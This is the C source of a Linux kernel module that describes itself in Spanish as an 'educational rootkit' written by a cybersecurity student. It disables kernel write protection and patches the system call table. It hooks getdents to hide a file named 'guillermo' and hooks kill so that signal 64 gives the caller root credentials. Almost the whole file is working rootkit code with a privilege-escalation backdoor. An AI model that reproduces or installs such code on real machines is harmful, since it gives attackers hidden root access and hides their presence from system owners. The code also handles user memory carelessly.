#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>
#include <linux/kernel.h>
#include <linux/cred.h>
#include <linux/uaccess.h>
#include <linux/signal.h>

#define DRIVER_AUTHOR "Estudiante de Ciberseguridad"
#define DRIVER_DESCRIPTION "Rootkit Educativo"

MODULE_LICENSE("GPL");
MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESCRIPTION);
MODULE_VERSION("1.0");

unsigned long **SYS_CALL_TABLE;

void EnablePageWriting(void)
{
    write_cr0(read_cr0() & (~0x10000));
}

void DisablePageWriting(void)
{
    write_cr0(read_cr0() | 0x10000);
}

struct linux_dirent
{
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
} *dirp2, *dirp3, *retn;

// Nombre del archivo a ocultar
char hide[] = "guillermo";

asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage int (*original_kill)(pid_t pid, int sig);

// Función para elevar privilegios
void elevate_privileges(void)
{
    struct cred *new_cred;
    new_cred = prepare_creds();
    if (new_cred == NULL)
    {
        printk(KERN_INFO "Error al preparar credenciales.\n");
        return;
    }

    // Cambiar UID, GID, y capacidades a root
    new_cred->uid = new_cred->euid = new_cred->suid = new_cred->fsuid = GLOBAL_ROOT_UID;
    new_cred->gid = new_cred->egid = new_cred->sgid = new_cred->fsgid = GLOBAL_ROOT_GID;
    commit_creds(new_cred);

    printk(KERN_INFO "Privilegios elevados a root.\n");
}

// Hook para sys_getdents
asmlinkage int HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
    struct linux_dirent *retn, *dirp3;
    int Records, RemainingBytes, length;

    Records = (*original_getdents)(fd, dirp, count);

    if (Records <= 0)
    {
        return Records;
    }

    retn = (struct linux_dirent *)kmalloc(Records, GFP_KERNEL);
    copy_from_user(retn, dirp, Records);

    dirp3 = retn;
    RemainingBytes = Records;

    while (RemainingBytes > 0)
    {
        length = dirp3->d_reclen;
        RemainingBytes -= dirp3->d_reclen;

        printk(KERN_INFO "RemainingBytes %d   \t File: %s", RemainingBytes, dirp3->d_name);

        if (strcmp((dirp3->d_name), hide) == 0)
        {
            memcpy(dirp3, (char *)dirp3 + dirp3->d_reclen, RemainingBytes);
            Records -= length;
        }
        dirp3 = (struct linux_dirent *)((char *)dirp3 + dirp3->d_reclen);
    }

    copy_to_user(dirp, retn, Records);
    kfree(retn);
    return Records;
}

// Hook para sys_kill
asmlinkage int HookKill(pid_t pid, int sig)
{
    // Verificar si la señal es la personalizada (64)
    if (sig == 64)
    {
        printk(KERN_INFO "Señal personalizada recibida. Elevando privilegios...\n");
        elevate_privileges();
        return 0; // Retornar éxito
    }

    // Llamar a la syscall original para otras señales
    return original_kill(pid, sig);
}

static int __init SetHooks(void)
{
    SYS_CALL_TABLE = (unsigned long **)kallsyms_lookup_name("sys_call_table");

    if (!SYS_CALL_TABLE)
    {
        printk(KERN_INFO "No se pudo encontrar la tabla de llamadas del sistema.\n");
        return -1;
    }

    printk(KERN_INFO "Rootkit educativo cargado.\n");
    printk(KERN_INFO "Tabla de llamadas del sistema en %p\n", SYS_CALL_TABLE);

    EnablePageWriting();
    original_getdents = (void *)SYS_CALL_TABLE[__NR_getdents];
    original_kill = (void *)SYS_CALL_TABLE[__NR_kill];
    SYS_CALL_TABLE[__NR_getdents] = (unsigned long *)HookGetDents;
    SYS_CALL_TABLE[__NR_kill] = (unsigned long *)HookKill;
    DisablePageWriting();

    return 0;
}

static void __exit HookCleanup(void)
{
    EnablePageWriting();
    SYS_CALL_TABLE[__NR_getdents] = (unsigned long *)original_getdents;
    SYS_CALL_TABLE[__NR_kill] = (unsigned long *)original_kill;
    DisablePageWriting();

    printk(KERN_INFO "Rootkit educativo descargado. Todo vuelve a la normalidad.");
}

module_init(SetHooks);
module_exit(HookCleanup);
